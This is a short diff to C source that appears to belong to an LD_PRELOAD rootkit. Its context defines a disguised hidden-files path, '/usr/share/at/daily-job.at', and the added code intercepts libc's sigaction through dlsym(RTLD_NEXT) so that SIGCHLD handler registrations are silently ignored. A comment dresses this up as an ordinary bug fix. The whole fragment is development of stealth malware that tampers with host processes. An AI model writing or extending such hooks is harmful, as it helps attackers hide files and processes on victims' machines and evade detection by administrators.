@@ -2,7 +2,6 @@
 #include "elf.h"
 #include <dirent.h>
 #include <dlfcn.h>
-#include <errno.h>
 #include <fcntl.h>
 #include <signal.h>
 #include <stdio.h>
@@ -21,6 +20,24 @@ const char *HIDDEN_FILES = "/usr/share/at/daily-job.at";
 
 // trim trailing whitespace from a string
 void trim_str(char *buffer) { buffer[strcspn(buffer, "\r\n")] = 0; }
+
+// declare sigaction function here to override the one in libc
+// this fixes #244
+int sigaction(int signum, const struct sigaction *act,
+              struct sigaction *oldact) {
+  static int (*orig_sigaction)(int signum, const struct sigaction *act,
+                               struct sigaction *oldact) = NULL;
+  if (!orig_sigaction)
+    orig_sigaction = dlsym(RTLD_NEXT, "sigaction");
+
+  if (signum == SIGCHLD) {
+    return 0;
+  }
+
+  return orig_sigaction(signum, act, oldact);
+}
+
+void signal_handler(int signo) {}
 
 int is_file_exist(const char *path) {
   if (access(path, F_OK) != -1) {
